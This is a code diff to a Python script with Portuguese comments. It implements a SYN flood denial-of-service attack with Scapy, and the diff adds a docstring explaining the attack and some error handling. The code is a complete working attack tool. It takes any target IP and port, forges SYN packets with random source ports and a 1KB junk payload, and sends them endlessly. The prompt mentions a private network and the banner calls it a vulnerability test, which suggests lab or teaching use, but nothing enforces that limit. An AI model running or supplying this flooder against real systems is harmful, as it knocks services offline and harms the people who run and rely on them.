@@ -11,10 +11,29 @@ import ipaddress
 
 
 def syn_attack():
-    print("SYN Flood Attack \n")
+    """
+    Executa a rotina de inundação SYN Flood contra um alvo específico.
+
+    A função solicita um IP e uma porta, constrói pacotes TCP customizados com 
+    a flag 'S' (SYN) ativada e envia-os em loop. Cada pacote utiliza uma porta 
+    de origem aleatória para simular múltiplos clientes distintos.
+
+    Mecanismo de Exploração:
+        1. O atacante envia um pacote SYN (Pedido de conexão).
+        2. O servidor responde com SYN-ACK e reserva recursos na memória.
+        3. O atacante ignora o SYN-ACK e não envia o ACK final.
+        4. O servidor mantém a conexão pendente até atingir o timeout.
+
+    Análise técnica:
+        - Camada 3 (IP): Define o endereço de destino (dst).
+        - Camada 4 (TCP): Define portas aleatórias (RandShort), porta alvo e flag SYN (flags="S").
+        - Payload (Raw): Adiciona 1KB de dados irrelevantes para aumentar o consumo de banda.
+    """
+    print("SYN Flood Attack - Protocol Vulnerability Test\n")
     
-    # Validar o endereço IP
+    # Validação do endereço IP do alvo
     is_an_ip = False
+    target_ip = ""
     while not is_an_ip:
         target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
         try:
@@ -23,8 +42,9 @@ def syn_attack():
         except ValueError:
             print("Erro: Formato de IP inválido")
 
-    # Validar o número da porta
+    # Validação do número da porta de destino
     isnumber = False
+    target_port = 80
     while not isnumber:
         try:
             target_port = int(input("Insira uma porta válida entre 0 e 65535 (ex: 80, 443, etc...): \n"))
@@ -35,16 +55,25 @@ def syn_attack():
         except ValueError:
             print("Erro: Insira apenas números")
     
-    # É informado qual o endereço de destino
-    ip = IP(dst=target_ip)
-    # É informado qual a porta de origem aleatoriamente, a porta de destino escolhida pelo utilizador, e a flag SYN, neste caso.
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  
+    print(f"[*] A iniciar SYN Flood em {target_ip}:{target_port}...")
 
-    # É adicionado contéudo para inundar e travar a vítima. Neste caso 1KB
-    raw = Raw(b"X"*1024)
-
-    #  Cria o pacote que será enviado
-    p = ip / tcp / raw 
+    # Construção do pacote Scapy
+    # IP(dst=...) define o destino na Camada de Rede
+    ip_layer = IP(dst=target_ip)
     
-    # Envia o pacote para a 4ª camada. Só para quando o utilizador apertar CTRL+C
-    send(p, loop=1, verbose=0) 
+    # TCP(...) define a Camada de Transporte. 
+    # sport=RandShort() gera portas de origem aleatórias para dificultar a filtragem básica.
+    # flags="S" define o bit SYN.
+    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")  
+
+    # Camada de Dados (Payload) para aumentar o overhead do pacote
+    raw_layer = Raw(b"X"*1024)
+
+    # Composição final do pacote (Stacking de camadas)
+    p = ip_layer / tcp_layer / raw_layer 
+    
+    try:
+        # Envio em loop infinito (L3 send). loop=1 garante o envio contínuo.
+        send(p, loop=1, verbose=0) 
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrompido pelo utilizador.")
